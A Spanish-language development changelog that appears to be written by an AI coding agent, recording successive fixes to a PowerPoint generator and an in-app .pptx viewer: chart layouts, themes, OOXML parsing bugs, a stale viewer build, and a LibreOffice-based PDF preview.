+  Esta vez el diagnóstico fue sobre EL ARCHIVO REAL que generó Chat (`qlmanage -t` para una miniatura
+  de la portada + desarmar el `.pptx` como zip y leer el XML crudo de las 5 diapositivas), no solo
+  guía general de la skill. Hallazgo concreto: al sacar la barra decorativa de F8-B125 (el "hallmark
+  de IA") no se puso NADA en su lugar — portada, cifra destacada y cierre quedaban con fondo 100%
+  blanco/color plano y dos bloques de texto, sin ningún elemento visual real (la skill pide
+  exactamente eso: "every slide needs a visual element", y no lo tenían). Esto además explica un bug
+  de comportamiento real en la propia sesión del dueño: Chat, al pedirle mejorar la estética de un
+  `.pptx`, respondió "PowerPoint no permite reproducir... elementos decorativos y colores
+  personalizados" — **falso** (`pptxgenjs` sí soporta formas con color), el agente estaba siendo fiel
+  a una herramienta genuinamente pelada, no mintiendo sobre una limitación real.
+- **`render-pptx.ts`**: cada layout ahora trae un elemento visual real, con formas (`addShape`), no
+  solo texto —
+  - `cover`: un círculo de acento que sangra por la esquina superior derecha, detrás del texto.
+  - `section`/`closing`: además del fondo a toda página (que ya era el elemento visual principal), un
+    círculo sutil en `onAccent` con 88% de transparencia sangrando por la esquina inferior izquierda
+    (textura, no compite con el texto).
+  - `bullets`: un punto de acento chico en la esquina superior derecha (lejos del número de página).
+  - `stat`: un círculo SOLO CON CONTORNO (sin relleno, `fill: {type:'none'}`) a la derecha, como una
+    "insignia" detrás de la cifra — composición cifra-a-la-izquierda/forma-a-la-derecha, no una barra.
+  - `steps` no cambia: los círculos numerados que ya tenía desde F8-B125 ya cumplían este punto.
+  - Todas las formas nuevas son `ellipse` (círculos), nunca `rect` — el anti-patrón real que marca la
+    skill es la barra/filete RECTANGULAR bajo el título, no "cualquier forma": un círculo de acento es
+    composición intencional, no decoración vacía.
+- **`render-pptx.test.ts`**: el test de "sin barras decorativas" se reescribió para distinguir esto —
+  ya no exige CERO formas (eso ahora sería falso, a propósito), exige cero formas con geometría
+  `rect` sin texto adentro (la barra puntual que se sacó). Test nuevo: cada layout trae al menos un
+  círculo (`prst="ellipse"`) en el XML real del `.pptx`.
+- **Verificación visual de verdad, no solo XML**: se generó un `.pptx` de prueba con el mismo contenido
+  exacto que probó el dueño (`qlmanage -t` de nuevo sobre el resultado) — la portada pasó de blanco
+  liso a tener el círculo de acento visible en la esquina; se confirmó por XML que las 5 diapositivas
+  del deck de prueba traen al menos un círculo y cero barras rectangulares decorativas.
+- **Verificado**: typecheck (`node`) limpio, lint limpio (mismos warnings preexistentes, ajenos),
+  prettier limpio, batería completa del repo en verde — 5814 pruebas (23 skipped, Windows-only), mismo
+  ruido ajeno de siempre (`computer/service-win.test.ts` en Mac). App reiniciada (se tocó
+  `render-pptx.ts`, proceso main).
+- **No verificado todavía**: que el dueño vea este resultado concreto (el círculo de acento, la
+  insignia en "stat", el punto de acento en "bullets") y lo encuentre convincente — si sigue sin
+  convencer, el siguiente paso realista es considerar paletas/tipografía personalizadas más allá de
+  los 5 temas fijos (lo que el dueño pidió al margen, en otra conversación con Chat, cuando comparó
+  contra una versión en HTML con "verde oscuro y ámbar" y tipografía serif) — eso es un cambio de
+  alcance mayor (schema nuevo), no entra en esta vuelta.
+
+## F8-B127 — PowerPoint F0: gráficos nativos, tarjetas, dos columnas y tipografía propia (sin LibreOffice)
+
+- **Contexto**: el dueño pidió investigar cómo Claude.ai genera presentaciones con tanta calidad y
+  abierta la puerta a empaquetar LibreOffice + un ciclo de render→captura→corrección con visión. Una
+  investigación a fondo con Opus (ver detalle en el mensaje al dueño, no repetido acá) encontró algo
+  más importante: la skill oficial de Anthropic usa la MISMA librería que ya tenemos (`PptxGenJS`), y
+  el salto real de calidad viene del FORMATO que le dan al modelo (gráficos, tarjetas, columnas,
+  tipografía variada), no solo del paso de revisión visual — ese paso pule desbordes/alineación, no
+  "diseña". Conclusión y plan acordados con el dueño: atacar el formato primero (F0, esta vuelta, sin
+  binarios nuevos); LibreOffice queda como fase posterior, solo si F0 no alcanza.
+- **`chat-doc-spec.ts`**: `PptxLayout` gana `'two-col'`, `'cards'`, `'chart'`. Nuevo `PptxChartSpec
+{type:'bar'|'line'|'pie', categories:string[], values:number[]}` y `chart?` opcional en
+  `PptxSlideSpec` (solo se usa con `layout:'chart'`). `isPptxSpec`/`isChartSpec` validan el tipo, que
+  `categories`/`values` tengan el mismo largo y como mucho `MAX_CHART_POINTS=12` puntos.
+- **`render-pptx.ts`**:
+  - `addChartSlide`: gráfico NATIVO de PowerPoint vía `addChart` (de verdad editable ahí después, no
+    una imagen) — confirmado abriendo el `.pptx` generado en PowerPoint real (no solo en el visor
+    simplificado ni en la miniatura de QuickLook, que ni siquiera renderiza gráficos embebidos: salía
+    en blanco y llevó a revisar esto con cuidado antes de confiar en esa herramienta de nuevo).
+  - `addTwoColSlide`: las `bullets` repartidas mitad y mitad en dos cuadros de texto lado a lado.
+  - `addCardsSlide`: cada `bullet` como una tarjeta (`roundRect` con relleno tenue del acento, grilla
+    de 1 a 3 columnas según cuántas), para listas de ítems/ventajas sin orden de proceso (a diferencia
+    de `"steps"`, que sí implica secuencia).
+  - **Tipografía por tema**: `Palette` gana `titleFont` — `Georgia` (serif) en `"green"`/`"warm"`,
+    `Arial` en el resto — SOLO en títulos, el cuerpo de texto sigue siempre en Arial por legibilidad.
+    Ambas son parte de la "lista segura" multiplataforma (vienen instaladas en Mac y Windows), así que
+    no debería cambiar de letra al abrirlo en otra máquina.
+- **`schemas.ts`**: `pptxLayout` extendido con los 3 layouts nuevos; nuevo `pptxChart` (mismo patrón
+  de "techo razonable al payload, la validación de verdad es `isPptxSpec`" que ya usan `xlsxCell`/
+  `xlsxColumnFormat`); `chart: optional(pptxChart)` agregado al validador por diapositiva — **se probó
+  el mismo tipo de bug real que ya había pasado con `layout`** (sacar el campo a propósito, confirmar
+  que el test nuevo falla, volver a ponerlo, confirmar que pasa).
+- **Prompt del agente de Chat** (`config.ts`/`chat.md`, sincronizados): documenta los 3 layouts
+  nuevos, el schema exacto de `chart`, y una guía nueva de longitud ("como mucho 4-5 viñetas cortas
+  por diapositiva: el cuadro de texto tiene un alto fijo, si hay más se corta — partir en más
+  diapositivas") — mitigación práctica mientras no exista medición real de texto (ver "No verificado").
+- **Pruebas nuevas**: `render-pptx.test.ts` sumó 6 (chart con categorías/valores reales en su propia
+  parte del `.pptx`, two-col reparte las viñetas en dos cuadros, cards con sus `roundRect` + texto,
+  tipografía por tema, y las validaciones de `isPptxSpec` para `chart`); `schemas.test.ts` sumó 3
+  (acepta `chart`/`two-col`/`cards`, rechaza un tipo de gráfico inventado) — confirmado que la nueva
+  de `chart` falla sin el campo declarado, mismo patrón de regresión que ya se usó para `layout`.
+- **Verificación visual de verdad, en PowerPoint real** (no solo XML ni el visor simplificado): se
+  generó un deck de prueba con los 6 layouts (incluidos los 3 nuevos, tema `"warm"` con tipografía
+  Georgia) y se abrió con `open -a "Microsoft PowerPoint"` + `screencapture` para mirarlo de verdad —
+  gráfico de barras con los 3 colores del tema, dos columnas legibles, tarjetas con su texto completo
+  (sin cortes), cifra destacada con su insignia de círculo — sin avisos de "reparar" al abrir.
+- **Verificado**: typecheck (`node`/`web`/`pwa`/`viewer`) limpio, lint limpio (mismos warnings
+  preexistentes, ajenos), prettier limpio, batería completa del repo en verde — 5822 pruebas (23
+  skipped, Windows-only), mismo ruido ajeno de siempre (`computer/service-win.test.ts` en Mac). App
+  reiniciada (se tocaron `render-pptx.ts`/`chat-doc-spec.ts`/`schemas.ts`/`config.ts`, proceso main).
+- **No verificado todavía**: no hay medición real de texto (fuentes reales en una ventana oculta) para
+  evitar desbordes — se mitigó con un límite práctico en el prompt (4-5 viñetas cortas), no con una
+  garantía de código; si el dueño prueba con texto más largo de lo que el prompt sugiere, puede
+  desbordar. Sigue sin imágenes propias (fotos/íconos) — ninguna librería nueva lo resuelve todavía.
+  LibreOffice (vista fiel + ciclo de revisión con visión) queda pendiente como fase posterior, solo si
+  el dueño prueba este resultado y sigue sin convencer.
+
+## F8-B128 — El visor propio mentía sobre cómo se veía el .pptx + portada/cifra a toda página
+
+- **El dueño probó F8-B127 y siguió viendo mal** ("algo pasa realmente"). Antes de tocar más
+  `render-pptx.ts`, se comparó el `.pptx` real generado (abierto en PowerPoint de verdad, con
+  `screencapture`) contra lo que mostraba el panel de la app — y NO coincidían: el `.pptx` real se veía
+  bien (círculo, gráfico, tarjetas, todo legible); el panel de la app ("Vista simplificada", el visor
+  estructural propio sin LibreOffice) lo pintaba mal. Causas reales, las tres en el parser/visor de
+  PowerPoint (`src/viewer/pptx/`), ninguna en `render-pptx.ts`:
+  1. **`solidFillOf` ignoraba `<a:alpha>`** (la transparencia): un tinte pensado como 8% opaco
+     (`transparency:92` de F8-B126) se pintaba 100% opaco — las tarjetas y los círculos de textura
+     salían como bloques sólidos oscuros en vez de sutiles.
+  2. **Ninguna forma respetaba su geometría real** (`<a:prstGeom prst="…">`): un círculo (`ellipse`)
+     se pintaba como un cuadrado — el visor no leía `prst` en absoluto.
+  3. **Un gráfico (`p:graphicFrame` con `c:chart`) se pintaba como una caja vacía** ("unknown",
+     cuadriculado gris) — el parser solo sabía de `p:sp`/`p:pic`/tabla, nada de gráficos.
+  - **Bug aparte, encontrado de paso**: `readXfrm` para `p:graphicFrame` (tablas, y ahora gráficos)
+    siempre devolvía `null` — `p:xfrm` de un graphicFrame YA es el contenedor de `a:off`/`a:ext` (a
+    diferencia de `p:spPr`, que ENVUELVE a `a:xfrm`) — así que toda tabla (preexistente, no de esta
+    sesión) caía siempre en una cajita de respaldo chica, ignorando su posición/tamaño real. Nuevo
+    `readXfrmDirect` en `ooxml.ts`; `readXfrm` ahora lo usa internamente.
+  - **`theme.ts`**: `solidFillOf` ahora lee `<a:alpha>` y devuelve `rgba()` cuando corresponde; nuevo
+    `strokeOf` (color de `<a:ln><a:solidFill>`, para una forma solo-contorno).
+  - **`model.ts`**: `Shape` (variante `'shape'`) gana `geom` (`'ellipse'|'roundRect'`, de `prstGeom`) y
+    `stroke` (solo cuando NO hay relleno — con relleno sería ruido que PowerPoint no muestra así).
+    Nueva variante `'chart'`: detecta el `p:graphicFrame` de un gráfico, resuelve su `r:id` al part
+    `ppt/charts/chartN.xml` (mismo patrón async que ya resolvía imágenes) y lo parsea (`parseChartXml`,
+    nuevo y exportado) — tipo, categorías y valores de la primera serie, soportando tanto
+    `c:strRef/c:strCache` como `c:multiLvlStrRef` (lo que escribe `pptxgenjs` cuando una categoría
+    podría confundirse con fecha/número).
+  - **`PptxViewer.tsx`**: `border-radius` según `geom` (50% para círculo); `border` para una forma
+    solo-contorno; nueva `ChartView` — SIN LibreOffice no hay cómo pintar un gráfico fiel, así que es
+    una vista estructural propia (barras/línea → barras CSS con su color por tema; torta →
+    `conic-gradient`) — mejor que la caja vacía de siempre, nunca pretende ser el gráfico real.
+  - **Pruebas nuevas**: `ooxml.test.ts` sumó 2 (`readXfrmDirect`); `theme.test.ts` sumó 4 (alpha→rgba,
+    sin alpha sigue igual, `strokeOf`); `model.test.ts` sumó 7 (tabla en su posición real — no la
+    cajita de respaldo —, gráfico detectado con su `rId`, geometría ellipse/roundRect/rect, contorno
+    solo sin relleno, 3 de `parseChartXml` incluido `multiLvlStrRef`).
+- **Pedido del dueño en paralelo**: "empieza a hacer pruebas y cuando tengas resultados profesionales
+  ahí recién implementas" — se armó un prototipo APARTE (fuera del repo, `pptxgenjs` directo) con fondo
+  a toda página en vez de blanco, se abrió en PowerPoint de verdad, y RECIÉN con eso confirmado se
+  llevó al código real — no al revés.
+- **`render-pptx.ts`**: `addCoverSlide` y `addStatSlide` pasan a fondo a toda página con el color de
+  acento (como ya hacían `section`/`closing`), con el mismo círculo sutil de textura (nuevo
+  `addBleedCircle`, factorizado de la duplicación que ya existía) — un fondo blanco con un solo adorno
+  chico se sentía vacío; a toda página se siente diseñado, confirmado contra el prototipo. `stat` subió
+  de 72 a 80pt de tamaño de cifra. El número de página de `stat` pasó de `p.accent` a `p.onAccent`
+  (bug real que esto hubiera introducido: sobre fondo de acento, un texto color acento es invisible).
+  Las diapositivas de contenido (`bullets`/`two-col`/`cards`/`chart`/`steps`) siguen en blanco, por
+  legibilidad de texto denso.
+- **Verificación visual de verdad, en PowerPoint real**: deck de prueba con los 6 layouts, tema `blue`
+  — portada y cifra ahora con fondo azul marino a toda página, círculo de textura, mismo lenguaje
+  visual que sección/cierre; las de contenido (gráfico/columnas/tarjetas) siguen en blanco, legibles.
+- **Investigación paralela, no implementada todavía**: el dueño pasó un `.pptx` de referencia (nivel
+  "Claude con Haiku") con una paleta de 14 tonos (no 1 acento fijo) y tipografías "Source Serif 4"/"IBM
+  Plex Sans" sin embeber en el archivo (dependen de que la máquina las tenga instaladas — no hay
+  garantía multiplataforma real ahí). Confirma que para cerrar ESA brecha específica hace falta un
+  cambio de alcance mayor (paleta/tipografía elegible, no solo temas fijos) — anotado, no implementado
+  esta vuelta, pendiente de decidir con el dueño.
+- **Verificado**: typecheck (`node`/`web`/`pwa`/`viewer`) limpio, lint limpio (mismos warnings
+  preexistentes, ajenos), prettier limpio, batería completa del repo en verde — 5928 pruebas (23
+  skipped, Windows-only), mismo ruido ajeno de siempre (`computer/service-win.test.ts` en Mac). App
+  reiniciada (se tocó `render-pptx.ts` en main y el visor en `src/viewer/`).
+
+## F8-B129 — PowerPoint: reescritura completa de una sola pasada (investigación a fondo primero, no otra ronda de parches)
+
+- **Pedido explícito del dueño** tras varias rondas reactivas de "arreglar lo que se vio feo":
+  "investiga a fondo como lo hace claude a fondo y después implementamos, no en la marcha". Se lanzó
+  una investigación con Opus (no implementada hasta tenerla completa) que: leyó ENTERA la skill
+  oficial `pptx` de Anthropic instalada en su entorno (`SKILL.md` + sus scripts de tema/gráfico —
+  **nunca copiados**, su licencia es propietaria y prohíbe derivar; solo se usaron sus REGLAS de
+  diseño, relevante porque esta app se va a publicar); analizó byte a byte un `.pptx` de referencia
+  real que el dueño generó con Chat (modelo Haiku) pidiéndole "mejorá la estética" (paleta de 14
+  tonos, tipografía Source Serif 4/IBM Plex Sans sin embeber, etiqueta tipo "CIFRA DESTACADA", pie en
+  itálica, paneles invertidos en un "antes/después"); e investigó si `pptxgenjs` soporta embeber
+  fuentes (no, sin post-procesar el archivo a mano — se decidió NO embeber: el riesgo de verse roto en
+  Keynote/Google Slides/nuestro propio visor no vale la pena todavía).
+- **Nuevo `src/main/extras/pptx-design.ts`**: el sistema de diseño separado del renderer, probable sin
+  generar ningún `.pptx`.
+  - `THEMES`: paleta de **14 tonos por tema** (antes: 1 solo acento) — `primary`/`primary2` (fondos a
+    toda página), `bg`/`surface`/`border` (contenido), `ink`/`body`/`muted`/`accent` (texto sobre
+    fondo claro), `accentOnDark`/`onDark`/`onDarkBody`/`onDarkMuted` (texto sobre fondo oscuro), 5
+    tonos de gráfico + `chartHi`/`chartSoft`. Los 5 temas de siempre (`blue`/`green`/`dark`/`warm`/
+    `mono`) se enriquecieron, no se reemplazaron. Títulos en Georgia (temas editoriales: blue/green/
+    warm) o Arial negrita (dark/mono); el cuerpo siempre en Arial — sin embeber, de la lista seguro
+    instalada en Mac y Windows.
+  - `fitText`: el tamaño más grande de una escalera que entra en su caja, estimado por ancho de
+    carácter (sin DOM en main, no se puede medir de verdad) — nunca recorta en silencio.
+  - `splitLabel`: "Etiqueta: resto" → la etiqueta en negrita, mismo renglón — nuevo en TODAS las
+    viñetas (bullets/steps/cards/columns), no solo donde ya estaba.
+  - `splitStatUnit`: "+27%"/"3.2x" → número + unidad separados (la unidad al 55% del tamaño, en la
+    MISMA línea) — sin esto, el prototipo anterior usaba un divisor vertical que el archivo de
+    referencia en realidad NO tenía (corregido por la propia investigación).
+  - `contrastRatio` (WCAG): cada par texto/fondo de los 5 temas se verificó ≥4.5:1 (≥3.5:1 para
+    etiquetas chicas en negrita sobre `primary2`, donde WCAG permite un umbral menor) — **probado**,
+    no "se ve bien a ojo" (`pptx-design.test.ts`, 15 pruebas).
+- **`chat-doc-spec.ts`**: campos nuevos, todos opcionales (compatibles con decks ya generados) —
+  `eyebrow`/`note` por diapositiva (etiqueta chica arriba / nota chica al pie — PURAMENTE
+  estructurales, el agente nunca inventa contenido si no hay algo real que decir), `footer` del deck
+  entero (pisado por el `note` de una diapositiva puntual), `columns` (exactamente 2, con `heading`
+  propio) para un `"two-col"` de verdad en vez de repartir `bullets` a la mitad.
+- **`render-pptx.ts`**: reescrito de punta a punta sobre `pptx-design.ts`.
+  - **Fondo a toda página en las 4 diapositivas de impacto**: `cover`/`closing` usan `primary`;
+    `section`/`stat` usan `primary2` — confirmado ANTES de escribir esto con un prototipo aparte
+    (`pptxgenjs` directo, abierto en PowerPoint de verdad) que un fondo blanco con un solo adorno
+    chico se siente vacío, a toda página se siente diseñado. El círculo de textura (`addBleedCircle`,
+    ya existía) ahora es compartido por las 4, mismo lenguaje visual.
+  - **`stat`**: la cifra se separa de su unidad si calza (`splitStatUnit`), ya NO en negrita (el
+    archivo de referencia la tiene regular, más elegante a 72-120pt).
+  - **`two-col`**: con `columns`, dos paneles de verdad (izquierdo `surface`, derecho `primary2`
+    invertido con su propio encabezado) — sin `columns`, sigue repartiendo `bullets` a la mitad
+    (compatibilidad).
+  - **`cards`**: cada tarjeta ahora trae un círculo numerado (como `steps`) + borde sutil.
+  - **`bullets`/`steps`/`cards`/`columns`**: "Etiqueta: resto" sale con la etiqueta en negrita.
+  - **`eyebrow`**: etiqueta en mayúsculas con espaciado entre letras arriba del contenido — en
+    `section` sin `eyebrow` se numera sola ("01", "02"...) en vez de inventar texto.
+  - **`chart`**: colores reales del tema (los 5 tonos de `THEMES.<tema>.chart`, no una terna
+    improvisada), sin líneas de grilla, con etiquetas de valor.
+  - `pres.theme = {headFontFace, bodyFontFace}` fijado (quien edite el `.pptx` en PowerPoint después
+    sigue en la misma tipografía). Lienzo 10×5.625 exacto (antes 5.63, redondeo).
+  - **Bug real encontrado y arreglado de paso**: `bulletRuns` armaba los runs con negrita pero los
+    volvía a juntar en un string plano antes de mandarlos a `pptxgenjs` (`.map(r => r.text).join('')`)
+    — la negrita de "Etiqueta:" nunca llegaba al archivo. Atrapado por un test que SÍ miraba la
+    negrita de verdad en el XML, no solo que el texto apareciera.
+- **El visor propio (`src/viewer/pptx/`) tenía más huecos de los que se habían arreglado en F8-B128**
+  (encontrados por la propia investigación, releyendo el parser entero):
+  1. **`<p:bg>` nunca se leía en NINGÚN nivel** — ni diapositiva, ni layout, ni maestro. Nuevo
+     `bgOf` (`theme.ts`) + `resolveBackground` (`model.ts`, probable aparte): herencia real de
+     PowerPoint, diapositiva→layout→maestro (ECMA-376 §19.3.1.1), soporta tanto `<p:bgPr><a:solidFill>`
+     (lo que escribe `pptxgenjs` en la diapositiva) como `<p:bgRef idx>` (lo que escribe en el
+     maestro). Es el bug que explica la queja del dueño: el `.pptx` real se veía perfecto en
+     PowerPoint, el panel de la app lo mostraba en blanco.
+  2. **`a:latin typeface` nunca se leía** — todo el texto salía en la fuente por defecto del navegador
+     sin importar el tema (Georgia/Arial). Nuevo campo `font` en `TextRun`, aplicado como
+     `fontFamily`.
+  3. **Los gráficos se pintaban con una paleta inventada del visor**, no los colores reales del
+     `.pptx`. Nuevo `chart.colors` en `parseChartXml` (lee `c:dPt`/`c:spPr`, con fallback al color de
+     toda la serie) — **bug real encontrado al escribir el test**: `c:idx` es un elemento HIJO de
+     `c:dPt` (`<c:idx val="0"/>`), no un atributo de `c:dPt` — `attrNum(dPt, 'idx')` buscaba en el
+     lugar equivocado, atrapado por el propio test antes de llegar a producción.
+  - Letter-spacing (`spc`), interlineado y anchor/insets de texto quedaron pendientes (menor impacto
+    visual que fondo/tipografía/color de gráfico; la investigación los señaló, no se atacaron esta
+    vuelta por alcance).
+- **Verificación visual de verdad en PowerPoint real** (no solo XML): deck completo con los 7 layouts
+  más `eyebrow`/`note`/`footer`/`columns`, abierto con `open -a "Microsoft PowerPoint"` +
+  `screencapture` — portada/cifra/cierre con fondo a toda página y círculo de textura, comparación
+  "antes/después" con panel derecho invertido, tarjetas numeradas, pasos con la etiqueta en negrita
+  funcionando de verdad. Separado: un script que corre `parseDeck` (el parser real del visor) contra
+  un `.pptx` recién generado confirmó fondo/tipografía/colores de gráfico resueltos correctamente de
+  punta a punta — **no se pudo verificar visualmente el panel DENTRO de la app corriendo** (abrir la
+  sesión de chat en vivo del dueño no es algo seguro de automatizar); pendiente que el dueño lo
+  confirme.
+- **Pruebas nuevas/reescritas**: `pptx-design.test.ts` (15, nuevo); `render-pptx.test.ts` reescrito
+  con los valores reales del nuevo sistema (27 pruebas, varias nuevas: fondo por tipo de diapositiva,
+  "Etiqueta: resto" en negrita de verdad en el XML, `columns`, `eyebrow`/`note`/`footer`, cifra con
+  unidad separada); `schemas.test.ts` sumó 4 (eyebrow/note/footer, columns válidas/inválidas — mismo
+  patrón de regresión de siempre: se sacó el campo, se confirmó que el test fallaba, se restauró);
+  `theme.test.ts` sumó 4 (`bgOf`); `model.test.ts` sumó 11 (`resolveBackground` con los 3 niveles de
+  herencia, tipografía, colores de gráfico reales).
+- **Verificado**: typecheck (`node`/`web`/`pwa`/`viewer`) limpio, lint limpio (mismos warnings
+  preexistentes, ajenos), prettier limpio, batería completa del repo en verde — 5965 pruebas (23
+  skipped, Windows-only), mismo ruido ajeno de siempre (`computer/service-win.test.ts` en Mac). App
+  reiniciada (se tocaron `render-pptx.ts`/`pptx-design.ts`/`chat-doc-spec.ts`/`schemas.ts` en main y
+  todo `src/viewer/pptx/`).
+- **No verificado todavía**: el panel DENTRO de la app corriendo, con una sesión de chat real del
+  dueño (ver arriba); letter-spacing/interlineado/anchor del visor quedaron pendientes.
+
+## F8-B130 — El visor nunca se estaba reconstruyendo (el bug de fondo real detrás de toda la sesión) + anchor/letter-spacing/espaciado entre viñetas
+
+- **El dueño probó F8-B129 y "lo sigue haciendo mal"** — mismo archivo `.pptx` que en PowerPoint real
+  se veía perfecto. Antes de tocar más código del visor, se revisó CÓMO se sirve `src/viewer/` a la
+  app: tiene su propio build, `npm run build:viewer` (`vite build --config vite.viewer.config.ts` →
+  `out/viewer/`), que `npm run dev` (`electron-vite dev`) **nunca incluye**. `out/viewer/` tenía fecha
+  del 7 de octubre a las 23:14 — es decir, **todos los arreglos del visor de F8-B128 y F8-B129
+  (fondo, tipografía, colores de gráfico) nunca llegaron al bundle que la app de verdad sirve**, por
+  más que typecheck/tests/prettier estuvieran perfectos y el código fuente estuviera bien. Cada "sigue
+  mal" del dueño era literalmente cierto: la app seguía mostrando el visor de ayer.
+  - Arreglado reconstruyendo (`npm run build:viewer`) antes de reiniciar `npm run dev`, confirmado con
+    `stat` que `out/viewer/` quedó más nuevo que el último archivo tocado en `src/viewer/`.
+  - **Guardado en memoria** (`lazunox-viewer-build.md`, fuera del repo): de ahora en más, tocar
+    `src/viewer/` implica correr `npm run build:viewer` aparte, siempre, antes de dar por buena una
+    verificación visual — para no repetir esta sesión completa por el mismo motivo.
+- **Con el bundle de verdad actualizado, el dueño confirmó que mejoró pero "aún no se ve 100% bien"**
+  — se investigaron (y arreglaron) los tres huecos del visor que F8-B129 había señalado como
+  pendientes, en vez de adivinar a ojo: se generó el `.pptx` real más reciente del dueño y se comparó
+  su XML byte a byte contra lo que el parser leía.
+  - **`anchor` de `<a:bodyPr>` nunca se leía** — el más visible de los tres: un título pensado para
+    apoyarse ABAJO de una caja alta (`anchor="b"`, la portada) salía arriba de su caja en el visor, con
+    un hueco vacío debajo — exactamente al revés de la composición pensada en `render-pptx.ts`. Nuevo
+    `anchor` en el tipo `Shape` (`'t'|'ctr'|'b'`), aplicado como `justifyContent` de un `flex-direction:
+column` en el `<div>` del texto (sin tocar `.pptx-shape` compartida, para no romper tabla/gráfico,
+    que ya traían su propio `display:flex` con otra dirección).
+  - **`spc` de `<a:rPr>` (espaciado entre letras) nunca se leía** — la etiqueta tipo "CIFRA DESTACADA"
+    salía pegada en vez de con el espaciado que la hace lucir "diseñada". Mismo formato que `sz`
+    (centésimas de punto): nuevo `letterSpacingPt` en `TextRun`.
+  - **`spcAft` (espacio entre viñetas) nunca se leía** — las listas salían más apretadas que en
+    PowerPoint. Nuevo `spaceAfterPt` en `TextParagraph`, de `a:pPr > a:spcAft > a:spcPts@val`.
+- **Pruebas nuevas**: `model.test.ts` sumó 6 (`anchor` con/sin valor, `letterSpacingPt` con/sin `spc`,
+  `spaceAfterPt` con/sin `spcAft`) — las tres con el mismo patrón de "bug real" ya establecido: se
+  confirmó que el campo realmente faltaba en el modelo antes de este cambio.
+- **Verificado**: typecheck (`node`/`web`/`pwa`/`viewer`) limpio, lint limpio (mismos warnings
+  preexistentes, ajenos), prettier limpio, batería completa del repo en verde — 5971 pruebas (23
+  skipped, Windows-only; un crash nativo de `libdatachannel`/WebRTC en una corrida se confirmó
+  transitorio, no relacionado, al repetir la corrida limpio). **`npm run build:viewer` corrido y
+  confirmado con `stat`** antes de reiniciar la app — el paso que faltó en las dos vueltas anteriores.
+- **No verificado todavía**: el panel DENTRO de la app corriendo con una sesión de chat real — esta vez
+  con el bundle de verdad actualizado y los 3 huecos restantes arreglados; insets de `bodyPr`
+  (`lIns`/`tIns`/`rIns`/`bIns`) quedaron sin tocar (nuestro propio contenido siempre los pide en 0 y el
+  visor nunca agregó relleno propio, así que coinciden por ahora sin necesidad de leerlos — documentado
+  por si algún día deja de ser cierto).
+
+## F8-B131 — El bug real del gráfico (etiquetas gigantes desbordadas) — encontrado con un arnés visual de verdad, no otra ronda de teoría
+
+- **El dueño, con razón, frenó otra investigación teórica** ("investiga no seas flojo", después de
+  aclarar que no hablaba de cómo genera archivos Claude.ai sino del visor propio que "se ve mal
+  mierda"). Confirmado aparte: Claude.ai NO tiene un visor de `.pptx` en vivo — genera el archivo y lo
+  da para descargar, nada más ([PCWorld](https://www.pcworld.com/article/2906610/anthropics-claude-ai-chatbot-can-now-create-and-edit-office-files.html)); la calidad que se ve ahí viene de abrir el archivo real en PowerPoint, que ya veníamos confirmando que queda bien. No había ningún "visor de Claude" que investigar — la pista llevaba a un callejón sin salida.
+  - En vez de seguir ajustando atributos de OOXML a ciegas, se armó un ARNÉS DE VERDAD: un mini-sitio
+    (`_scratch_harness/`, Vite + React, descartado al terminar) que importa el `SlideCanvas` REAL del
+    visor (se exportó, antes era privado) junto con el `styles.css` REAL, alimentado con el `Deck` que
+    arma `parseDeck` sobre el `.pptx` MÁS RECIENTE que generó el dueño — abierto en Chrome de verdad
+    (`mcp__claude-in-chrome`) para ver EXACTAMENTE los mismos píxeles que ve la app, sin tocar la
+    sesión de chat en vivo del dueño.
+  - **Encontrado al toque, mirando la diapositiva 3 (gráfico)**: las etiquetas "Jul"/"Ago"/"Sep" salían
+    gigantes, desbordadas fuera de su columna. Causa: `.pptx-chart-bar-label`/`.pptx-chart-legend-item`
+    usaban `font-size: 9cqw` — `cqw` mide contra el ancestro con `container-type` más cercano, que es
+    el LIENZO ENTERO (`.pptx-canvas-wrap`), no la columna angosta de la barra — 9% del ancho de TODA
+    la diapositiva es un tamaño de letra enorme para una etiqueta chica. El resto del texto del visor
+    usa `ptToCqw` (calculado desde el tamaño de punto real de OOXML), por eso se veía bien; esta CSS
+    era un valor puesto a ojo cuando se armó la vista de gráfico en F8-B128, nunca verificado
+    visualmente hasta ahora. Bajado a `1.6cqw` (equivalente a ~11pt en un lienzo de 10 pulgadas, el
+    mismo orden que el resto del texto chico).
+  - **El resto del deck (7 diapositivas, incluidas portada/sección/dos columnas/tarjetas/cifra/cierre)
+    se vio genuinamente bien** en el mismo arnés — fondo a toda página, tipografía, `anchor`,
+    espaciado entre letras y entre viñetas, todo andando (F8-B128/129/130 confirmados de verdad, no
+    solo por los datos).
+- **Técnica nueva para el futuro**: el arnés (`SlideCanvas` real + `styles.css` real + `Deck` real de
+  `parseDeck`, en Chrome de verdad vía `mcp__claude-in-chrome`) es la forma correcta de verificar
+  cambios al visor de ahora en más — mucho más rápido y preciso que razonar sobre CSS a ciegas o pedirle
+  al dueño que pruebe en su sesión en vivo cada vez. Se exportó `SlideCanvas` de `PptxViewer.tsx` para
+  que quede disponible (cambio chico, aditivo, sin riesgo).
+- **Verificado**: typecheck (`viewer`) limpio, lint limpio, prettier limpio, batería del visor en verde
+  — 124 pruebas. **`npm run build:viewer` corrido y confirmado con `stat`** antes de reiniciar la app
+  (memoria de F8-B130 aplicada). Arnés temporal borrado al terminar (`_scratch_harness/`, archivos
+  `.pptx`/`.json` de prueba en `/tmp`).
+- **No verificado todavía**: confirmación del dueño en su propia sesión — esta vez con un bug real,
+  concreto y visualmente confirmado de por medio (no otra ronda de "debería estar mejor").
+
+## F8-B132 — Vista previa de PowerPoint vía LibreOffice: el render REAL, no una aproximación
+
+- **El dueño, con el arnés ya mostrando un deck prolijo, preguntó por qué seguía "viéndose mal"** en
+  casos puntuales, y después de una vuelta de ida y vuelta sobre si valía la pena ("pero dejalo al
+  nivel de Claude") se confirmó el camino: en vez de seguir sumando atributos de OOXML al visor
+  estructural (transparencia, geometría, fondo, tipografía, espaciado — F8-B128 a F8-B131), usar
+  LibreOffice para convertir el `.pptx` real a PDF y mostrar ESE PDF con el visor de PDF que ya existe
+  (pdf.js) — el render de verdad, no una aproximación hecha a mano.
+  - **Instalado y probado empíricamente en este Mac** (`brew install --cask libreoffice`, con permiso
+    explícito del dueño — el propio sistema bloqueó el intento automático por ser una instalación de
+    software, así que lo corrió él mismo): `soffice --headless --convert-to pdf` tardó **2.5s en frío,
+    ~1.3s en caliente**, y el PDF resultante sale **pixel a pixel igual a PowerPoint real** — círculo
+    de textura, tipografía, espaciado entre letras, todo. Mucho mejor y más rápido de lo que la
+    investigación teórica anterior (F8-B127) había estimado.
